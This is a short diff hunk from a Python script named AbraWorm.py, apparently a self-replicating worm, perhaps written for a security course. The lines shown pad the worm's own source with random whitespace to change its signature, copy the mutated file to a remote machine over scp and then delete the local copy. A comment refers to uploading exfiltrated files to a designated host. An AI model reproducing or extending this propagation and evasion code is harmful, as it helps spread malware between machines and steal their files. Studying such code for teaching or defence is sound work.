@@ -142,12 +142,12 @@ while True:
                         random_line_with_spaces = line.strip() + ' ' * rand_size + '\n'
                         all_lines[line1] = random_line_with_spaces
 
-                    with open('AbraWorm.py', 'w') as file:
-                        file.writelines(all_lines)
-
+                    file = open('AbraWorm.py', 'w')
+                    file.writelines(all_lines)
+                    file.close()
                     scpcon.put('AbraWorm.py')
-                    os.remove('AbraWorm.py')
                     scpcon.close()
+                    os.remove('AbraWorm.py')
                 except:
                     continue
                 # Now upload the exfiltrated files to a specially designated host,
